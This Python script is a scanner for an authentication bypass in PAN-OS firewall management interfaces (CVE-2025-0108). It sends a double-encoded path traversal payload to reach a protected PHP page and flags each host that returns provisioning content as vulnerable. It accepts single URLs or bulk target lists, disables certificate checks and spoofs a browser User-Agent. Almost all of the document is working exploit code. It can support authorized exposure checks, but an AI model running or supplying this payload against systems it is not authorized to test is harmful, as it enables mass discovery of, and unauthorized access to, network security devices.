import requests
from urllib.parse import urljoin
import argparse
import sys
import ssl

ssl._create_default_https_context = ssl._create_unverified_context
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def read_urls_from_file(file_path):
    try:
        with open(file_path, 'r') as file:
            urls = [line.strip() for line in file if line.strip()]
        return urls
    except Exception as e:
        print(f"[ERROR] Failed to read file: {e}", file=sys.stderr)
        sys.exit(1)

def construct_exploit_url(base_url):
    exploit_path = "/unauth/%252e%252e/php/ztp_gate.php/PAN_help/x.css"
    return urljoin(base_url.rstrip("/") + "/", exploit_path)

def test_vulnerability(url):
    try:
        exploit_url = construct_exploit_url(url)
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
        }
        response = requests.get(exploit_url, verify=False, headers=headers, allow_redirects=False)

        # Check for vulnerability indicators
        if response.status_code == 200 and "Zero Touch Provisioning" in response.text:
            print(f"\033[31m[VULNERABLE] {url}\033[0m")
            return True
        elif response.status_code == 302 and "Location" in response.headers:
            print(f"[REDIRECTED] {url} -> {response.headers['Location']}")
        else:
            print(f"[SAFE] {url}")
    except requests.RequestException as e:
        print(f"[ERROR] Request failed for {url}: {e}", file=sys.stderr)
    except Exception as e:
        print(f"[ERROR] An unexpected error occurred: {e}", file=sys.stderr)
    return False

def process_single_url(url):
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    test_vulnerability(url)

def process_url_list(file_path):
    urls = read_urls_from_file(file_path)
    for url in urls:
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        test_vulnerability(url)

def main():
    parser = argparse.ArgumentParser(description="PAN-OS Authentication Bypass Checker (CVE-2025-0108)")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-u", "--url", help="Single URL to test")
    group.add_argument("-f", "--file", help="File containing a list of URLs to test")
    args = parser.parse_args()

    if args.url:
        process_single_url(args.url)
    elif args.file:
        process_url_list(args.file)

if __name__ == "__main__":
    main()